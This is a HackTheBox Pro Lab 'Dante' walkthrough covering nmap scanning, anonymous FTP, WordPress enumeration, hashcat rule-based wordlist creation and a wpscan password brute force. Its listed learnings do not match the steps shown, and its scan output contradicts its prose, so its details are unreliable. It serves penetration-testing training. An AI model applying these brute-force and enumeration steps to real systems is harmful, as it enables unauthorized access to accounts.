# Dante

**Platform: HacktheBox Pro Labs**

**OS: Linux/Windows**


## Key Learnings

- Become exposed to Tensorflow and exploiting h5 files
- Use Docker to run python script
- Doing local port forwarding to gain access to internal ports and services
- Become more familiar with enumerating a Linux machine
- Using Backrest commands to read sensitive files
- The hacker mindset of exploiting a backup feature to read the root flag


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Do a ping sweep of the external network to discover alive hosts

```
$ nmap -sn -T5 --min-rate=1000 -oN external_ping_scan 10.10.110.0/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-13 16:35 CST
Nmap scan report for 10.10.110.2
Host is up (0.066s latency).
Nmap scan report for 10.10.110.100
Host is up (0.067s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 2.47 seconds
```

Discovered to hosts on the 10.10.110/24 network: .2 and .100

2. Do a full service scan of all ports for the 2 alive hosts

```
$ nmap -sC -sV -T5 --min-rate=1000 -p- -Pn -oN external_service_scan -iL external_hosts 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-13 16:38 CST
Nmap scan report for 10.10.110.2
Host is up.
All 65535 scanned ports on 10.10.110.2 are in ignored states.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 126.36 seconds
```
The nmap output shows 1 host that has open ports, 10.10.110.100, which has 2 open ports of interest, FTP on 21 and HTTP on 65000. 

3. We first test FTP. We try to login anonymously, which is successful. We then proceed to enumerate and exfiltrate any files we can get our hands on. We come across a `todo.txt` file that we download to our local machine.

```
$ ftp 10.10.110.100 
Connected to 10.10.110.100.

```

4. Before moving on to test port 65000, lets read the contents of the `todo.txt`

```
$ cat todo.txt 
- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
```

5. The nmap scan for port 65000 output tells us about a `/wordpress` directory, and the contents of this file indicate that we are likely dealing with a Wordpress site. 

6. We browse to the URL `http://10.10.110.100:65000/wordpress` and confirm our findings.

<img width="1400" height="1188" alt="image" src="https://github.com/user-attachments/assets/e40b9e96-063f-41cd-ab63-5ee4eae61cc7" />

7. Since we are dealing with a Wordpress website, we run a wpscan on it and enumerate all plugins and users

`wpscan --url http://10.10.110.100:65000/wordpress -e ap,u`

This command gives us the following output:

```
$ wpscan --url http://10.10.110.100:65000/wordpress -e ap

8. The wpscan didn't find any plugins but it did find user `james`, so we will do a bruteforce attack to get his password. However, before we do, we will create a custom wordlist of passwords using Hashcat rules

```
$ cat custom.rules                          

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@

$ hashcat --force /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt -r custom.rules --stdout | sort -u > custom_passwords.wordlist
```

9. Now run password bruteforce attack with custom password list
```
$ wpscan --url http://10.10.110.100:65000/wordpress -U james -P custom_passwords.wordlist -t 50
